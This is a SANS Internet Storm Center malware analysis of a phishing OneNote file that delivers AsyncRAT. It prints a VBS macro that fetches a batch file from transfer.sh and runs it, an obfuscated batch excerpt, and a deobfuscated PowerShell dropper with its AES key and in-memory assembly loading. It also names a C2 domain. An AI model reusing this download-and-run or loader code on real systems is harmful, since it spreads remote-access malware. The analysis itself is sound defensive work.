---
title: A First Malicious OneNote Document, (Wed, Jan 25th)
url: https://isc.sans.edu/diary/rss/29470
source: SANS Internet Storm Center, InfoCON: green
date: 2023-01-26
fetch_date: 2025-10-04T04:52:58.836259
---

# A First Malicious OneNote Document, (Wed, Jan 25th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29462)
* [next](/diary/29472)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [A First Malicious OneNote Document](/forums/diary/A%2BFirst%2BMalicious%2BOneNote%2BDocument/29470/)

**Published**: 2023-01-25. **Last Updated**: 2023-01-25 08:45:41 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[2 comment(s)](/diary/A%2BFirst%2BMalicious%2BOneNote%2BDocument/29470/#comments)

Attackers are always trying to find new ways to deliver malware to victims. They recently started sending Microsoft OneNote files in massive phishing campaigns[[1](https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/)]. OneNote files (ending the extension ".one") are handled automatically by computers that have the Microsoft Office suite installed. Yesterday, my honeypot caught a first sample. This is a good opportunity to have a look at these files. The file, called "delivery-note.one", was delivered as an attachment to a classic phishing email:

![](https://isc.sans.edu/diaryimages/images/isc-20230125.png)

The attacker used a simple trick to hide suspicious elements: The script linked to the "Click to view document" PNG picture is just... behind this picture! Funny to mention, the script name contains a weird character:

```

remnux@remnux:/MalwareZoo/20230124$ ll t*
total 273
drwxr-xr-x 1 501 dialout   352 Jan 24 01:57 ./
drwxr-xr-x 1 501 dialout  4992 Jan 24 00:54 ../
-rwxr-xr-x 1 501 dialout  1703 Jan 24 01:50 temp?eno.hta*
remnux@remnux:/MalwareZoo/20230124$ file tem?eno.hta
tempsrotanimret enil FLRC htiw , txet IICSA ,tnemucod LMTH : ath.one
```

As you can see, the filename contains a control character that alters the console output :-)

```

temp<202e>eno.hta: HTML document, ASCII text, with CRLF line terminators
```

The file contains the VBS macro that will perform the malicious actions. In the meantime, Didier wrote a new tool to analyze (and extract data) from OneNote files. The tool is called like all Didiers's tools: onedump.py[[2](https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/)]. It is still in beta but already does a great job:

```

remnux@remnux:/MalwareZoo/20230124$ ./onedump.py delivery-report.one
File: delivery-report.one
 1: 0x000022e8 .PNG 89504e47 0x00000147 9cc9eb32f6ed4a3cef2e62e258895f95
 2: 0x00002588 ..<! 0d0a3c21 0x000006a7 cf8d9fcdfdc57816f71c7858d791352f
 3: 0x00003230 .PNG 89504e47 0x0000145d ddb6da5a6385b9a062409e605c66f682
```

Steam number 2 looks the most interesting one (starting with "<!"). Let's dump it, and it's indeed the file that I extracted manually:

```

remnux@remnux:/MalwareZoo/20230124$ ./onedump.py delivery-report.one -s 2 -d >payload2.hta
```

The HTA file is not obfuscated at all and is easy to analyze. The most important code is this one:

```

Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://www.onenotegem.com/uploads/soft/one-\
       templates/the_daily_schedule.one -OutFile $env:tmp\invoice.one; Start-Process -Filepath $env:tmp\invoice.one"
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://transfer.sh/get/DdAbds/window.bat -OutFile \
       $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
End Sub
```

The first ExecuteCmdAsync() will download a simple note that is not malicious and open it. Probably to make the victim happy and confident that the first note is legit.

The second execution will fetch and execute a Windows .bat file. This one is nicely obfuscated:

```

@echo off
set "JPZP=set "
%JPZP%"IbCwXoVeuS=st"
%JPZP%"EDdachcxsu=co"
%JPZP%"JcCljvtvxr=nd"
%JPZP%"YbFfFTKUTq=do"
%JPZP%"zvSrMqnEdP=s\"
%JPZP%"zVLVxWvHnO=py"
%JPZP%"wVwufyXxrS=we"
%JPZP%"WgLLiMRuoi=.e"
%JPZP%"RqGZoaKZAe=ex"
%JPZP%"OEdsMkxhlk="%~0."
%JPZP%"HchdqIWNWd=xe"
%JPZP%"vikkHukEfD=in"
%JPZP%"msPLCkdRjQ=0\"
```

This snippet of the script will help you to understand how it works: A lot of environment variables are created and, below, concatenated to build commands. If it's difficult to read, it's easy to deobfuscate. Just add a bunch of "echo" at the beginning of all lines at the bottom of the file and execute it. Here is the generated code (beautified):

```

copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "test.bat.exe"
cls
cd "C:\Users\REM\Desktop\"
"test.bat.exe" -noprofile -windowstyle hidden -ep bypass -command
$hfShb = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\REM\Desktop\test.bat').Split([Environment]::NewLine);
foreach ($TIZnc in $hfShb)
{
    if ($TIZnc.StartsWith(':: '))
    {
        $OPowf = $TIZnc.Substring(3); break;
    };
};
$kJJdx = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($OPowf);
$xypSr = New-Object System.Security.Cryptography.AesManaged;
$xypSr.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$xypSr.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$xypSr.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('Cao+K/bvGpiu3YwMcce0n/wD4E4gfQmkj3F2tfn9rZk=');
$xypSr.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('lAK9B8Af6zbgofnvIf4zYQ==');
$wkMnt = $xypSr.CreateDecryptor();
$kJJdx = $wkMnt.TransformFinalBlock($kJJdx, 0, $kJJdx.Length);
$wkMnt.Dispose();
$xypSr.Dispose();
$XQlHS = New-Object System.IO.MemoryStream(, $kJJdx);
$CoXOG = New-Object System.IO.MemoryStream;
$AbQce = New-Object System.IO.Compression.GZipStream($XQlHS, [IO.Compression.CompressionMode]::Decompress);
$AbQce.CopyTo($CoXOG);
$AbQce.Dispose();
$XQlHS.Dispose();
$CoXOG.Dispose();
$kJJdx = $CoXOG.ToArray();
$MnaeK = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($kJJdx);
$INAif = $MnaeK.EntryPoint;$INAif.Invoke($null, (, [string[]] ('')))
exit /b
```

Did you see the next obfuscation technique? Interesting strings are reversed:

```

('gnirtS46esaBmorF'[-1..-16] -join '')
```

This script is a dropper. The payload is located in the file and read by PowerShell. It is identified by lines starting with ":: ":

```

foreach ($TIZnc in $hfShb)
{
    if ($TIZnc.StartsWith(':: '))
    {
        $OPowf = $TIZnc.Substring(3); break;
    };
};
```

The payload is AES encrypted. Let's decrypt it with CyberChef:

![](https://isc.sans.edu/diaryimages/images/isc-20230125-2.png)

The decrypted PE file (SHA256:ee1713429991c75fb6d53b6ed6dd0296ae7889a86c85b55d20a782c332948b7a) is unknown on VT. It's an ASyncRAT and tries to connect to wormxwar[.]ddns[.]net as C2...

[1] <https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/>
[2] <https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Obfuscation](/tag.html?tag=Obfuscation) [OneNote](/tag.html?tag=OneNote) [Malware](/tag.html?tag=Malware) [VBS](/tag.html?tag=VBS)

[2 comment(s)](/diary/A%2BFirst%2BMalicious%2BOneNote%2BDocument/29470/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/29462)
* [next](/diary/29472)

### Comments

Thank you for this write up Xavier!

May I ask, how did you come up with the AES decryption information?

Thanks again!

#### sox

#### Jan 26th 2023 2 years ago

nvm, I realized my mistake. Thank you again ...